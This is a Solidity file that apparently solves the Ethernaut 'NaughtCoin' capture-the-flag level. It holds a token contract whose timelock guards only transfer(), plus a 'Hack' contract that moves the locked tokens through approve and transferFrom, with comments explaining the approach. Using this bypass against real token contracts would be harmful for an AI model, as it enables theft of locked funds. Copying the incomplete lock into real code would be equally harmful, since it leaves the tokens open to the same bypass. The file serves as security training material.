// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    // Transfer function is override with lockTokens modifier!
    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // We need to find a way to trick the modifier (gives revert "tokens still locked")
    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getTimeLock() public view returns (uint256) {
        return timeLock;
    }

    // Underflow is not working here: Solidity 0.8.0 + timelock has already been set at deployment
    // We can use transferFrom() in a hack contract (see below)
    
    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock, "Tokens still locked");
            _;
        } else {
            _;
        }
    }
}

contract Hack {

    // Contract instance 
    NaughtCoin public hack;

    uint256 public amount;

    // Deploy
    constructor(address _targetAddress) {
        hack = NaughtCoin(_targetAddress);
    }

    // First, player needs to approve the hack contract 
    // We need the player's address which is a public state variable in the parent contract 
    function getPlayerAddress() public view returns (address) {
        return hack.player();
    }
    function getAmount() public returns (uint256) {
        amount = hack.balanceOf(hack.player());
        return amount;
    }

    function exploit(uint256 amount) public {
        
        // In ERC20, only the token holder (in this case, player) can approve a spender. 
        // Since Hack is trying to approve itself without being the player, it lacks the permission to do so directly.
        // hack.approve(address(this), amount);
        // Solution: let EOA approve the transfer first manually!
        // Then call exploit function



        // Now, `Hack` can transfer tokens from `player`'s balance using `transferFrom`
        hack.transferFrom(hack.player(), msg.sender, amount);
    }



}
